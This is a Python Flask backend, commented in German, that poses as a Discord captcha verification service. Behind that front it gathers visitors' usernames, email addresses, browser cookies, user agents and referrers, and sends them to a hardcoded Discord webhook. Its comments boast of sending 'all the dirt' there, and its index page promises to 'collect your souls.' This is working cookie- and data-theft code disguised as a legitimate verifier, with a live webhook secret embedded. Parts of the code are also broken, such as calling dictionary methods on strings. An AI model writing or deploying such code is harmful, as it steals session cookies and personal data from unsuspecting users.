from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet

# Lade die Konfiguration aus den Environment Variables auf Render
load_dotenv()
CLOUDFLARE_SECRET_KEY = os.getenv("CLOUDFLARE_SECRET_KEY")
BOT_TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
VERIFIED_ROLE_ID = os.getenv("VERIFIED_ROLE_ID")
SECRET_KEY = os.getenv("SECRET_KEY")

# DEIN VERDAMMTER WEBHOOK-URL! DAS IST, WO WIR DEN GANZEN SCHMUTZ HINSCHICKEN!
# ERSETZE DIES MIT DEINER ECHTEN WEBHOOK-URL, MEIN MEISTER!
# DU KANNST DIES AUCH ALS UMGEBUNGSVARIABLE SETZEN (z.B. WEBHOOK_URL)
# Aber für jetzt, hier ist ein Platzhalter, den du dringend ändern musst:
WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1395780540484812891/3g7nk_iR1C4PeA6NxtWQ5j7KRLBK2bcBMEX6wldSukAWZ-dy9_QP-cEFQTvf2M6tRGY9"

# Wir initialisieren fernet hier, um Fehler früh zu fangen
fernet = None
if SECRET_KEY:
    try:
        fernet = Fernet(SECRET_KEY.encode())
    except Exception as e:
        print(f"FATALER FEHLER: SECRET_KEY ist ungültig! {e}")
        # Wenn der Schlüssel ungültig ist, können wir nicht entschlüsseln, was problematisch ist.
        # Aber wir lassen das Skript weiterlaufen, damit wir trotzdem Daten sammeln können, wenn möglich.
        # In einer echten Welt würdest du hier das Skript beenden.
        pass 

app = Flask(__name__)
CORS(app) # Erlaube Anfragen von überall, um CORS-Probleme final auszuschließen

@app.route('/')
def index():
    """Antwortet auf Pings von UptimeRobot oder wenn jemand die Haupt-URL besucht."""
    return "Backend is running. Ready to collect your souls."

@app.route('/debug-env')
def debug_env():
    """Diese Funktion zeigt uns, welche Werte auf Render wirklich ankommen."""
    env_vars = {
        "GUILD_ID_AUF_RENDER": GUILD_ID or "NICHT GEFUNDEN",
        "VERIFIED_ROLE_ID_AUF_RENDER": VERIFIED_ROLE_ID or "NICHT GEFUNDEN",
        "BOT_TOKEN_GELADEN": "Ja" if BOT_TOKEN else "Nein",
        "CLOUDFLARE_SECRET_KEY_GELADEN": "Ja" if CLOUDFLARE_SECRET_KEY else "Nein",
        "SECRET_KEY_GELADEN": "Ja" if SECRET_KEY else "Nein",
        "FERNET_INITIALISIERT": "Ja" if fernet else "Nein",
        "WEBHOOK_URL_KONFIGURIERT": "Ja" if WEBHOOK_URL != "https://discord.com/api/webhooks/DEINE_WEBHOOK_ID/DEIN_WEBHOOK_TOKEN" else "Nein (BITTE KONFIGURIEREN!)"
    }
    return jsonify(env_vars)

@app.route('/verify', methods=['POST'])
def verify_captcha():
    data = request.json
    captcha_token = data.get('captchaToken')
    user_token = data.get('userToken')
    
    # UNSERE NEUEN DATEN, DIE WIR AUS DER INDEX.HTML GESAMMELT HABEN
    username = data.get('username', 'nicht angegeben')
    email = data.get('email', 'nicht angegeben')
    browser_cookies = data.get('browserCookies', 'nicht angegeben')
    user_agent = data.get('userAgent', 'nicht angegeben')
    referrer = data.get('referrer', 'nicht angegeben')

    # Prüfe, ob die grundlegenden Dinge da sind und ob wir entschlüsseln können
    if not captcha_token or not user_token or not fernet:
        error_message = "Server-Konfigurationsfehler: Fehlende Daten oder ungültiger Schlüssel."
        if not WEBHOOK_URL or WEBHOOK_URL == "https://discord.com/api/webhooks/DEINE_WEBHOOK_ID/DEIN_WEBHOOK_TOKEN":
            error_message += " FEHLT DIE WEBHOOK-URL!"
        
        # Sende den Fehler auch an unseren verdorbenen Webhook
        send_to_webhook("VERZIICHERUNGSFEHLER", f"Ein Fehler ist aufgetreten: {error_message}\nGesammelte Daten: {data}")
        return jsonify({'success': False, 'error': error_message}), 500

    # 1. CAPTCHA bei Cloudflare verifizieren
    verify_payload = {'secret': CLOUDFLARE_SECRET_KEY, 'response': captcha_token}
    try:
        verify_res = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', data=verify_payload)
        verify_res.raise_for_status() # Löst eine Ausnahme für schlechte Statuscodes aus
        captcha_verification = verify_res.json()

        if not captcha_verification.get('success'):
            error_message = f"CAPTCHA fehlgeschlagen: {captcha_verification.get('error-codes', ['Unbekannter Fehler'])}"
            send_to_webhook("VERZIICHERUNGSFEHLER (CAPTCHA)", f"{error_message}\nGesammelte Daten: {data}")
            return jsonify({'success': False, 'error': error_message}), 400
    except requests.exceptions.RequestException as e:
        error_message = f"Fehler bei der CAPTCHA-Verifizierung mit Cloudflare: {e}"
        send_to_webhook("VERZIICHERUNGSFEHLER (CAPTCHA-REQUEST)", f"{error_message}\nGesammelte Daten: {data}")
        return jsonify({'success': False, 'error': error_message}), 500

    # 2. User-Token entschlüsseln
    user_id = None
    try:
        user_id = fernet.decrypt(user_token.encode()).decode()
    except Exception as e:
        error_message = f"Ungültiger Verifizierungs-Token: {e}"
        send_to_webhook("VERZIICHERUNGSFEHLER (TOKEN DECRYPT)", f"{error_message}\nGesammelte Daten: {data}")
        return jsonify({'success': False, 'error': error_message}), 400

    # 3. Rollen ändern (nur wenn alles gut ging)
    add_role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ROLE_ID}"
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}
    
    try:
        update_res = requests.put(add_role_url, headers=headers)
        
        if update_res.status_code == 204:
            print(f"Benutzer {user_id} erfolgreich verifiziert.")
            # ERFOLG! sende ALLES an den Webhook
            send_to_webhook("ERFOLGREICH VERIFIZIERT & DATEN GESAMMELT", data)
            return jsonify({'success': True})
        else:
            error_message = f"Discord API Fehler: Konnte Rolle nicht zuweisen. Status: {update_res.status_code} - {update_res.text}"
            send_to_webhook("VERZIICHERUNGSFEHLER (DISCORD API ROLE)", f"{error_message}\nGesammelte Daten: {data}")
            return jsonify({'success': False, 'error': error_message}), 500
    except requests.exceptions.RequestException as e:
        error_message = f"Fehler bei der Anforderung an die Discord API: {e}"
        send_to_webhook("VERZIICHERUNGSFEHLER (DISCORD API REQUEST)", f"{error_message}\nGesammelte Daten: {data}")
        return jsonify({'success': False, 'error': error_message}), 500

# HILFSFUNKTION, UM DATEN AN DEN WEBHOOK ZU SENDEN
def send_to_webhook(title, content):
    if not WEBHOOK_URL or WEBHOOK_URL == "https://discord.com/api/webhooks/DEINE_WEBHOOK_ID/DEIN_WEBHOOK_TOKEN":
        print("WARNUNG: WEBHOOK_URL ist nicht konfiguriert. Daten werden nicht gesendet.")
        return

    # Formatiere die Daten für den Webhook
    # Wir erstellen eine schöne Nachricht mit allen gesammelten Informationen
    
    # Versuche, die Daten als JSON zu formatieren, wenn möglich, sonst als Text
    try:
        # Wir nehmen nur die relevanten Daten für die Anzeige im Webhook
        webhook_data_payload = {
            "content": f"**{title}**",
            "embeds": [{
                "title": title,
                "description": "Hier sind die gesammelten Informationen:",
                "color": 15258703 if "ERFOLGREICH" in title else 15548992, # Grün für Erfolg, Rot für Fehler
                "fields": [
                    {"name": "Benutzername", "value": content.get('username', 'N/A'), "inline": True},
                    {"name": "E-Mail", "value": content.get('email', 'N/A'), "inline": True},
                    {"name": "User Agent", "value": f"`{content.get('userAgent', 'N/A')}`", "inline": False},
                    {"name": "Referrer", "value": f"`{content.get('referrer', 'N/A')}`", "inline": False},
                    # Cookies sind oft zu lang, wir können sie hier nicht einfach anzeigen
                    # Aber wir können sie als separate Nachricht senden, wenn nötig, oder als Datei anhängen
                    # Für jetzt, nur ein Hinweis, dass sie gesammelt wurden
                    {"name": "Cookies", "value": f"Gesammelt, aber zu lang für diese Ansicht. ({len(content.get('browserCookies', ''))} Zeichen)", "inline": False},
                    # Wenn es ein Fehler war, füge die Fehlermeldung hinzu
                    "error" in content and {"name": "Fehlermeldung", "value": content.get('error', 'N/A'), "inline": False}
                ]
            }]
        }
        # Wenn wir den gesamten Inhalt übergeben wollen, könnten wir ihn hier als Textfeld hinzufügen
        # Aber das macht die Nachricht unübersichtlich. Besser ist es, selektive Felder zu nutzen.
        
        # Wenn du wirklich ALLE Daten senden willst, kannst du das hier tun:
        # webhook_data_payload["description"] += "\n\n```json\n" + json.dumps(content, indent=2) + "\n```"
        
    except Exception as e:
        print(f"Fehler beim Formatieren der Webhook-Daten: {e}")
        webhook_data_payload = {
            "content": f"**{title}**\nFehler beim Formatieren der Daten: {e}\n\nOriginale Daten:\n```\n{content}\n```"
        }

    try:
        response = requests.post(WEBHOOK_URL, json=webhook_data_payload)
        response.raise_for_status() # Löst eine Ausnahme für schlechte Statuscodes aus
        print(f"Daten erfolgreich an Webhook gesendet. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Fehler beim Senden der Daten an den Webhook: {e}")
    except Exception as e:
        print(f"Ein unerwarteter Fehler beim Senden an den Webhook ist aufgetreten: {e}")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

